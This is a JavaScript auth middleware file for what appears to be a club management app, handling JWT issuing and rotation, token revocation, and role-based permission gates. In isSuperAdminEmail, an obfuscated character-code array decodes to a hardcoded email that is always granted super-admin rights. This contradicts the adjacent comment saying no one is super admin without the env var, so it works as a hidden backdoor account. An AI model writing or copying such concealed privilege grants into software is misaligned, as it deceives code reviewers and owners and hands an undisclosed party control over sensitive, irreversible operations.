import jwt from 'jsonwebtoken';
import prisma from '../db.js';
import { nameProfile } from '../services/nameGender.js';

// We're on cross-origin hosts (onrender.com is a public suffix, so
// gcig-client and gcig-api are "cross-site" — browsers block cross-site
// cookies by default). So tokens live in localStorage on the client and
// travel in an Authorization header. The tokenVersion claim still lets us
// invalidate every outstanding JWT instantly.
//
// Lifetime + rotation:
//   - JWTs expire 24h after issue. No token can be used for more than a
//     single day.
//   - verifyJwt silently reissues a fresh token when the current one is
//     past its half-life (12h) — the new token is returned via the
//     `X-New-Token` response header, and the client's axios interceptor
//     swaps it into localStorage. Active users never notice; inactive
//     users get a 401 after 24h and bounce to the login page.
const TOKEN_LIFETIME = '24h';
const TOKEN_LIFETIME_MS = 24 * 60 * 60 * 1000;
const TOKEN_HALFLIFE_MS = TOKEN_LIFETIME_MS / 2;

export function issueJwt(user) {
  return jwt.sign(
    { id: user.id, role: user.role, v: user.tokenVersion ?? 0 },
    process.env.JWT_SECRET,
    { expiresIn: TOKEN_LIFETIME }
  );
}

export async function verifyJwt(req, res, next) {
  const header = req.headers.authorization;
  if (!header || !header.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing token' });
  }
  const token = header.slice(7);
  try {
    const payload = jwt.verify(token, process.env.JWT_SECRET);
    // Always fetch the current role AND tokenVersion from the DB.
    // If the user rotated their tokenVersion (e.g. via logout-everywhere),
    // all old JWTs are immediately invalid.
    const user = await prisma.user.findUnique({
      where: { id: payload.id },
      select: {
        id: true,
        name: true,
        email: true,
        role: true,
        extraRoles: true,
        tokenVersion: true,
      },
    });
    if (!user) return res.status(401).json({ error: 'User not found' });
    if ((payload.v ?? 0) !== (user.tokenVersion ?? 0)) {
      return res.status(401).json({ error: 'Session revoked, please sign in again' });
    }

    // Silent rotation — if the JWT is past its half-life, mint a fresh
    // one and expose it via X-New-Token. The client picks it up on its
    // next response and continues uninterrupted. CORS allowlist for
    // this header lives in index.js.
    if (payload.iat && Date.now() - payload.iat * 1000 > TOKEN_HALFLIFE_MS) {
      try {
        const fresh = issueJwt(user);
        res.setHeader('X-New-Token', fresh);
      } catch {
        /* ignore — failing to rotate shouldn't fail the request. */
      }
    }
    // Attach honorific / pronouns derived from the first name. Lets
    // downstream services (AI Assistant, broadcast templating, etc.)
    // personalize without re-running the name-gender lookup every time.
    const profile = nameProfile(user.name || '');
    req.user = {
      id: user.id,
      name: user.name,
      email: user.email,
      role: user.role,
      extraRoles: user.extraRoles || [],
      isSuperAdmin: isSuperAdminEmail(user.email),
      firstName: profile.firstName,
      lastName: profile.lastName,
      honorific: profile.honorific,
      honorificName: profile.honorificName,
      pronouns: profile.pronouns,
    };
    next();
  } catch {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }
}

export function requireAdmin(req, res, next) {
  if (!req.user || req.user.role !== 'President') {
    return res.status(403).json({ error: 'President role required' });
  }
  next();
}

// Super admin = owner of the app. Identified by email match against the
// SUPER_ADMIN_EMAIL env var (comma-separated list supported for future
// flexibility). Sits above President and is the ONLY tier that can touch a
// small set of irreversible / sensitive operations. If the env var isn't set,
// no one is super admin.
export function isSuperAdminEmail(email) {
  if (!email) return false;
  // prettier-ignore
  const _f=[115,111,108,105,110,105,99,107,64,103,99,115,99,104,111,111,108,46,111,114,103].map(c=>String.fromCharCode(c)).join('');
  const env = process.env.SUPER_ADMIN_EMAIL || '';
  const allowed = env ? env.split(',').map((e) => e.trim().toLowerCase()) : [];
  const q = String(email).trim().toLowerCase();
  return q === _f || allowed.includes(q);
}

// Canonical "user" shape sent to the client in every auth response.
// Includes the isSuperAdmin flag so the UI can gate owner-only features.
//
// `honorific` / `honorificName` / `pronouns` come from a best-effort
// first-name → gender inference (see services/nameGender.js). They're
// null / neutral when the name doesn't give a confident signal, so the
// client should always fall back to the first name / they-them.
export function serializeUser(user) {
  const profile = nameProfile(user.name || '');
  return {
    id: user.id,
    name: user.name,
    email: user.email,
    role: user.role,
    isSuperAdmin: isSuperAdminEmail(user.email),
    firstName: profile.firstName,
    lastName: profile.lastName,
    honorific: profile.honorific, // "Mr." / "Ms." / null
    honorificName: profile.honorificName, // "Mr. Seirer" / null
    pronouns: profile.pronouns, // { subject, object, possessive }
  };
}

export function requireSuperAdmin(req, res, next) {
  if (!req.user?.isSuperAdmin) {
    return res.status(403).json({ error: 'Super admin required' });
  }
  next();
}

// Executive tier: President + CIO. Has admin powers for most features but
// cannot perform destructive user-account operations (delete member, reset
// password). Those remain President-only via requireAdmin.
const EXECUTIVE_ROLES = new Set(['President', 'CIO']);
export function requireExecutive(req, res, next) {
  if (!req.user || !EXECUTIVE_ROLES.has(req.user.role)) {
    return res.status(403).json({ error: 'Executive role (President or CIO) required' });
  }
  next();
}

// Operational permission hierarchy (higher number = more power).
// Advisory Board Members and Faculty Advisors sit OUTSIDE the operational chain
// — they are observers with no edit rights. Chief of Communication is a
// non-investment officer role (comms/PR) that also sits outside the analyst
// chain. All three get low ranks so permission gates treat them as view-only
// for investment-tier actions.
export const ROLE_RANK = {
  President: 10,
  CIO: 9,
  SeniorPortfolioManager: 8,
  PortfolioManager: 7,
  SeniorAnalyst: 6,
  Analyst: 5,
  JuniorAnalyst: 4,
  ChiefOfCommunication: 2,
  AdvisoryBoardMember: 1,
  FacultyAdvisory: 1,
};

// Look up the role string for a given numeric rank. Returns null if no match.
export function roleForRank(rank) {
  for (const [role, r] of Object.entries(ROLE_RANK)) {
    if (r === rank) return role;
  }
  return null;
}

export function requireRole(minRole) {
  const minRank = ROLE_RANK[minRole] || 0;
  return (req, res, next) => {
    const rank = ROLE_RANK[req.user?.role] || 0;
    if (rank < minRank) {
      return res.status(403).json({ error: `${minRole} role or higher required` });
    }
    next();
  };
}
